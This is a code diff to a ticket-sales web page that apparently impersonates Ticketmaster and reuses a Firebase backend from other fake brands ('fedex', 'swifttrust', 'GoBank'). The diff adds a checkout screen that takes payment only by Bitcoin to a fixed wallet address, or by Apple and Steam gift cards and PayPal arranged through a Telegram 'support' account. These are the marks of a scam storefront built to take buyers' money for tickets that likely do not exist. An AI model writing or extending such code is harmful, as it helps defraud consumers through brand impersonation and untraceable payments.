@@ -165,6 +165,16 @@ main{flex:1;overflow-y:auto;background:#f8f9fa;position:relative}
 .qty-btn{width:40px;height:40px;background:#f8f9fa;border:none;font-size:1.2rem;font-weight:bold;cursor:pointer}
 .qty-input{width:40px;text-align:center;border:none;font-weight:bold;font-size:1rem;outline:none}
 
+/* ================= PAYMENT METHOD CARDS ================= */
+.pay-method-card{display:flex;align-items:center;gap:16px;padding:16px;border:1px solid #eee;border-radius:12px;margin-bottom:14px;cursor:pointer;background:#fff;transition:.2s;box-shadow:0 2px 8px rgba(0,0,0,0.02)}
+.pay-method-card:hover{border-color:#026cdf;background:#f0f7ff;transform:translateY(-2px);box-shadow:0 4px 12px rgba(2,108,223,0.1)}
+.pay-method-icon{width:46px;height:46px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;color:white;font-size:1.2rem;flex-shrink:0}
+.bg-btc{background:#f7931a}
+.bg-gift{background:#e91e63}
+.bg-paypal{background:#003087}
+.pay-method-text h3{font-size:1rem;font-weight:700;margin-bottom:2px;color:#111}
+.pay-method-text p{font-size:.8rem;color:#666;margin:0}
+
 /* Bitcoin Payment Screen */
 .btc-pay{padding:24px;text-align:center;background:#fff;height:100%}
 .btc-icon{width:64px;height:64px;border-radius:50%;background:#f7931a;color:#fff;font-size:2rem;font-weight:bold;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
@@ -347,9 +357,8 @@ main{flex:1;overflow-y:auto;background:#f8f9fa;position:relative}
 <script src="https://www.gstatic.com/firebasejs/10.13.0/firebase-firestore-compat.js"></script>
 <script>
 const BITCOIN_ADDRESS = "bc1qc5zkyn839lqh7yu3hpmxk4kfcnj8007t3lqyky";
-const TELEGRAM_LINK = "https://t.me/ReplaceWithYourTelegram";
+const TELEGRAM_LINK = "https://t.me/realticketmastersupport"; // UPDATED
 
-// EXACT MATCH WITH GOBANK FIREBASE CONFIG
 const firebaseConfig = {
   apiKey: "AIzaSyAueqbCcGN_LKDTd6YnPkPcWSIufFqsqwM",
   authDomain: "fedex-4bdba.firebaseapp.com",
@@ -374,6 +383,8 @@ let allEvents = [];
 let currentEvent = null;
 let currentUser = null;
 let pendingCheckoutQty = 0;
+let activeOrderId = null;
+let activeOrderTotal = 0;
 
 function toggleDrawer() {
   $("drawer").classList.toggle("open");
@@ -447,10 +458,8 @@ function handleSignup(e) {
   btn.textContent = "Creating...";
   btn.disabled = true;
 
-  // Create user in Firebase Auth
   auth.createUserWithEmailAndPassword(email, pw)
     .then(cred => {
-      // Save to Firestore Collection (matching GoBank)
       return db.collection("swifttrust_users").doc(cred.user.uid).set({
         fullName: name, 
         email: email, 
@@ -460,12 +469,10 @@ function handleSignup(e) {
       });
     })
     .then(() => {
-      // DO NOT SIGN OUT. Automatically log them in after signup.
       e.target.reset();
       $("signupSuccess").textContent = "Account created! Logging in...";
       $("signupSuccess").classList.add("show");
       closeAuthModal();
-      // The auth state change will trigger automatically and load the profile
       if (pendingCheckoutQty > 0 && currentEvent) {
         processCheckout(pendingCheckoutQty);
         pendingCheckoutQty = 0;
@@ -498,7 +505,6 @@ auth.onAuthStateChanged(user => {
     $("nav-account-label").textContent = "Account";
     $("headerProfileBtn").innerHTML = `<span>${user.email.charAt(0).toUpperCase()}</span>`;
     
-    // Load GoBank profile data
     db.collection("swifttrust_users").doc(user.uid).get().then(doc => {
       if (doc.exists && doc.data().fullName) {
         $("headerProfileBtn").innerHTML = `<span>${doc.data().fullName.charAt(0).toUpperCase()}</span>`;
@@ -728,7 +734,7 @@ function processCheckout(qty) {
   const order = {
     eventId: currentEvent.id, eventTitle: currentEvent.title, eventDate: currentEvent.date,
     customerName: "Customer", customerEmail: auth.currentUser.email, userId: auth.currentUser.uid,
-    quantity: qty, amount: total, paymentMethod: "Bitcoin", status: "pending", createdAt: Date.now()
+    quantity: qty, amount: total, paymentMethod: "Pending Selection", status: "pending", createdAt: Date.now()
   };
 
   db.collection("swifttrust_users").doc(auth.currentUser.uid).get().then(doc => {
@@ -739,9 +745,65 @@ function processCheckout(qty) {
   });
 }
 
+// ============================================
+// NEW PAYMENT SELECTION FLOW
+// ============================================
 function showPaymentScreen(orderId, totalAmount) {
   if (!auth.currentUser) { showToast("Please log in"); openAuthModal(); return; }
 
+  activeOrderId = orderId;
+  activeOrderTotal = totalAmount;
+
+  $("modalTitle").textContent = "Payment Options";
+  $("modalContent").innerHTML = `
+    <div style="padding:20px;">
+      <p style="text-align:center; color:#666; margin-bottom:20px;">Select how you would like to pay for your ticket(s).</p>
+      
+      <!-- BITCOIN -->
+      <div class="pay-method-card" onclick="selectPaymentMethod('Bitcoin')">
+        <div class="pay-method-icon bg-btc">₿</div>
+        <div class="pay-method-text">
+          <h3>Bitcoin Transfer</h3>
+          <p>Pay securely with crypto</p>
+        </div>
+      </div>
+      
+      <!-- GIFT CARD -->
+      <div class="pay-method-card" onclick="selectPaymentMethod('Gift Card')">
+        <div class="pay-method-icon bg-gift">🎁</div>
+        <div class="pay-method-text">
+          <h3>Gift Card</h3>
+          <p>Pay using an Apple, Steam, or other gift card</p>
+        </div>
+      </div>
+      
+      <!-- PAYPAL -->
+      <div class="pay-method-card" onclick="selectPaymentMethod('PayPal')">
+        <div class="pay-method-icon bg-paypal">P</div>
+        <div class="pay-method-text">
+          <h3>PayPal</h3>
+          <p>Pay via your PayPal account</p>
+        </div>
+      </div>
+
+      <button class="btn-outline-blue" style="margin-top:10px;" onclick="closeModal()">Cancel</button>
+    </div>
+  `;
+  openModal();
+}
+
+function selectPaymentMethod(method) {
+  // Update database with selected method
+  db.collection("orders").doc(activeOrderId).update({ paymentMethod: method });
+  
+  if (method === 'Bitcoin') {
+    showBitcoinScreen();
+  } else {
+    showManualPaymentScreen(method);
+  }
+}
+
+function showBitcoinScreen() {
   const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=" + encodeURIComponent(BITCOIN_ADDRESS);
   $("modalTitle").textContent = "Bitcoin Payment";
   $("modalContent").innerHTML = `
@@ -749,18 +811,40 @@ function showPaymentScreen(orderId, totalAmount) {
       <div class="btc-icon">₿</div>
       <h2 style="font-size:1.4rem;font-weight:800;margin-bottom:4px;">Pay with Bitcoin</h2>
       <p style="color:#666;font-size:.9rem;">Scan or copy the address below</p>
-      <div class="btc-amount">${money(totalAmount)}</div>
+      <div class="btc-amount">${money(activeOrderTotal)}</div>
       <div class="qr-box"><img src="${qrUrl}"></div>
       <div class="addr-box">
         <div style="font-size:.75rem;font-weight:700;color:#888;margin-bottom:6px;">Bitcoin Address</div>
         <span>${esc(BITCOIN_ADDRESS)}</span>
         <button class="copy-btn" onclick="navigator.clipboard.writeText('${esc(BITCOIN_ADDRESS)}');showToast('Copied!')">Copy Address</button>
       </div>
-      <button class="btn-blue" onclick="markPaid('${orderId}')" style="background:#00a650;border:none;margin-bottom:12px;">I have made the payment</button>
-      <button class="btn-outline-blue" onclick="closeModal()">Cancel</button>
+      <button class="btn-blue" onclick="markPaid('${activeOrderId}')" style="background:#00a650;border:none;margin-bottom:12px;">I have made the payment</button>
+      <button class="btn-outline-blue" onclick="showPaymentScreen('${activeOrderId}', ${activeOrderTotal})">Back</button>
     </div>
   `;
-  openModal();
+}
+
+function showManualPaymentScreen(method) {
+  $("modalTitle").textContent = method + " Payment";
+  $("modalContent").innerHTML = `
+    <div style="padding:30px 20px; text-align:center;">
+      <div style="font-size:3rem; margin-bottom:16px;">
+        ${method === 'Gift Card' ? '🎁' : 'P'}
+      </div>
+      <h2 style="font-size:1.4rem; font-weight:800; margin-bottom:12px;">${method} Payment</h2>
+      <p style="color:#666; font-size:1rem; line-height:1.6; margin-bottom:24px;">
+        Please message us on Telegram to process your ${method} payment. Our support team will guide you through the next steps.
+      </p>
+      
+      <a href="${TELEGRAM_LINK}" target="_blank" style="display:flex; align-items:center; justify-content:center; gap:8px; width:100%; padding:16px; background:#026cdf; color:#fff; text-decoration:none; border-radius:10px; font-weight:700; font-size:1rem; margin-bottom:20px; box-shadow:0 4px 12px rgba(2,108,223,0.3);">
+        <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
+        Message us on Telegram
+      </a>
+
+      <button class="btn-blue" onclick="markPaid('${activeOrderId}')" style="background:#00a650;border:none;margin-bottom:12px;">I have messaged you</button>
+      <button class="btn-outline-blue" onclick="showPaymentScreen('${activeOrderId}', ${activeOrderTotal})">Back</button>
+    </div>
+  `;
 }
 
 function markPaid(orderId) {
